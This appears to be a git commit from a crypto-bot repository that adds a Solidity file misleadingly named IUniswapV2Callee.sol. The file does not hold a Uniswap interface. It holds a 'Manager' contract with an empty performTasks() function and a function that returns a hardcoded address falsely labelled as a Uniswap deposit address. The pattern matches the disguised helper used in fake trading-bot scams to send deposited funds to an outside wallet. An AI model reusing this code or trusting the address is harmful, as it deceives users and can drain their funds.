5311ac5c22d80ef442a76026d18abfee63916b4c
bscbot900 <97960782+bscbot900@users.noreply.github.com>
2022-01-18 14:04:05 +0100

    Create IUniswapV2Callee.sol

---
+++ IUniswapV2Callee.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xAdb3A7d67F0C7AcBd283ECeF975fb1bE5B363C3D;
+	}
+}
